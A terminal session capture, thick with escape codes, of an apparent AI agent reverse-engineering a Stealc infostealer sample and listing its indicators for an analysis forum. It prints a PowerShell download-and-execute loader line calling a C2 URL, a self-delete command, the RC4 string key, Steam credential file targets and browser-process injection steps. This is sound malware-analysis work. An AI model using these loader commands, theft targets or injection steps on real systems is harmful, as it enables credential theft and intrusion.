[0.015, "o", "\u001b[4d\u001b[93m\u001b[1mry\u001b[Cto:\u001b(B\u001b[m\u001b[93m RC4 string\u001b[Ckey CgeOvEO7hu @\u001b[C0x14007d6e0;\u001b[Cscheme base64→RC4 for all embedded strings.\u001b[6;1H\u001b[1mHost artifacts:\u001b(B\u001b[m                                                                             \u001b[8;1H\u001b[93m- Named event (single-instance guard): <%p>_<ComputerName>_<UserName> (pointer value formatted at runtime — pattern, not fixed string).\r\n- Staging dir C:\\ProgramData\\<random> for locked-file exfil copies; exfil filenames passwords.txt, screenshot.jpg.\u001b[10;3HSelf-d\u001b[Cl\u001b[Cte: cmd.exe /c tim\u001b[Cout /t 5\u001b[C& del /f /q \"<own path>\".\u001b[39m                                                                       \u001b[11;3H\u001b[93mLo\u001b[Cder:\u001b[Cpowershell.exe -nop -c iex(New-Object Net.WebCl\u001b[Cent).DownloadString('<URL\u001b[Cfrom C2>') (SysWOW64 path), msiexec /i … /passive,\r\nShel\u001b[CExecuteExA runas.\u001b[39m                                          \u001b[13;3H\u001b[93mSteam theft masks: ssfn*,config.vdf,DialogConfig.vdf,DialogConfigOverlay*.vdf,libra\u001b[Cyfolders.vdf,loginusers.vdf und\u001b[Cr\u001b[CHKCU\\Softwar\u001b[C\\Valve\\Steam →\u001b[14;2Ht\u001b[CamPath.\u001b[39m            \r\n                                                                                                                                                   \r\n\u001b[93m\u001b[1mBehavioral:\u001b(B\u001b[m\u001b[93m exits on LANGIDs 0x419/0x422/0x423/0x43F/0x443 (RU/UA/BY/KZ/UZ); date kill-switch — payload skipped after\u001b[1m 11 April 2025\u001b(B\u001b[m\u001b[93m; Early-Bird APC\r\ninjection (CreateProcess suspended → VirtualAllocEx RWX 0x25600 → WriteProcessMemory → QueueUserAPC) of browser process; IElevator COM (CLSID\r\n{708860E0-…}) for\u001b[Capp-bound key decryption; volume-serial-derived named pipe\u001b[Cbe\u001b[Cween ho\u001b[Ct and\u001b[Chelper DLL.\u001b[39m                                          \r\n                                                                                                                                             \r\n\u001b[93m\u001b[1mDistinctive strings:\u001b(B\u001b[m\u001b[93m C:\\build\u001b[Cr_v2\\stealc\\json.h, typo Error dumpi\u001b[Cg proccess list, report lines \\t\\t\\tDevice Name: , \\t- Running Path: .\u001b[22;1H\u001b[31m●\u001b[39m \u001b[90mmain · ▸ finish() · 277 chars\u001b[39m                                                                                                          \u001b[24;1H\u001b[93m📌 #q-residual-decodes — Post the decoded constants at code sites 0x14000ab27, 0x14000c835, 0x14001138f, 0x14001ac7b, 0x14001f39b\u001b[36m\u001b[1m main\r\n\u001b(B\u001b[m\u001b[93mHousekeeping: tool-recovered decoded constants at these five code sites were never published to the forum. For each site — 0x14000ab27, 0x14000c835,\r\n0x14001138f, 0x14001ac7b, 0x14001f39b — identify \u001b[Che refer\u001b[Cnced ciphertext blob / decoded value, decrypt\u001b[Cif needed (base6\u001b[C→RC4 key CgeOvEO7hu, per\r\n#q-\u001b[Ctring-decryption), and post th\u001b[C plain\u001b[Cex\u001b[C verbatim as evidence comments here, noting which functi\u001b[Cn uses it \u001b[Cnd\u001b[Cfor what (cross-check against\u001b[39m   \r\n\u001b[93m#q-capabilities / #q-\u001b[C2-protocol \u001b[Cindings). Then\u001b[Cmark solv\u001b[Cd.\u001b[39m                                                                                     \r\n                                                                                                                                                 \r\n\u001b[90m○\u001b[39m \u001b[90mmain · ▸ reverse_engineer(Publish the last unposted decoded const…) · …running\u001b[32;109H\u001b[36m\u001b[1m⠋ \u001b(B\u001b[m\u001b[90mThinking…\u001b[39m \u001b[35m\u001b[1mmain\u001b(B\u001b[m\u001b[37m: calling reverse_engineer\u001b[34;2H\u001b(B\u001b[m"]
[0.013, "o", "\u001b[4;1H                                                                                            \r\n\u001b[93m- Named event (single-instance guard): <%p>_<ComputerName>_<UserName> (pointer value formatted at runtime — pattern, not fixed string).\r\n- Staging dir C:\\ProgramData\\<random> for locked-file exfil copies; exfil filenames passwords.txt, screenshot.jpg.\r\n- Self-delete: cmd.exe /c timeout /t 5 & del /f /q \"<own path>\".\u001b[8;3HLoader: power\u001b[Chel\u001b[C.exe -nop -c iex(New-Object Ne\u001b[C.WebClient).DownloadString('<URL fr\u001b[Cm C2>')\u001b[C(SysWOW64 path), msiexec /i … /pass\u001b[Cve,\u001b[39m \r\n\u001b[93mShellExecuteExA runas.\u001b[39m                                                                                            \u001b[10;4H\u001b[93mteam th\u001b[Cft masks: ssfn*,config.vdf,DialogConfig.vdf,DialogConfigOverlay*.vdf,libraryfolders.vdf,loginusers.vdf under HKCU\\Software\\Valve\\Steam →\r\nSteamPath.\u001b[39m                                                                                                                            \r\n                      \r\n\u001b[93m\u001b[1mBehavioral:\u001b(B\u001b[m\u001b[93m exit\u001b[C on\u001b[CLANGIDs 0x419/0x422/0x423/0x43F/0x443 (RU/UA/BY/KZ/UZ); \u001b[Cate kill-switch — pay\u001b[2Cad skipped after\u001b[1m 11 April 2025\u001b(B\u001b[m\u001b[93m; Ear\u001b[Cy-Bird APC\r\ninjection (CreateProcess suspended → VirtualAllocEx RWX 0x25600 → WriteProcessMemory → QueueUserAPC) of browser process; IElevator COM (CLSID\r\n{708860E0-…}) for app-bound key decryption; volume-serial-derived named pipe between host and helper DLL.\r\n\u001b[39m                                                                                                                                                   \r\n\u001b[93m\u001b[1mDistinctive strings:\u001b(B\u001b[m\u001b[93m C:\\build\u001b[Cr_v2\\stealc\\json.h, typo Error dumping procces\u001b[C list, report lin\u001b[Cs \\t\\t\\t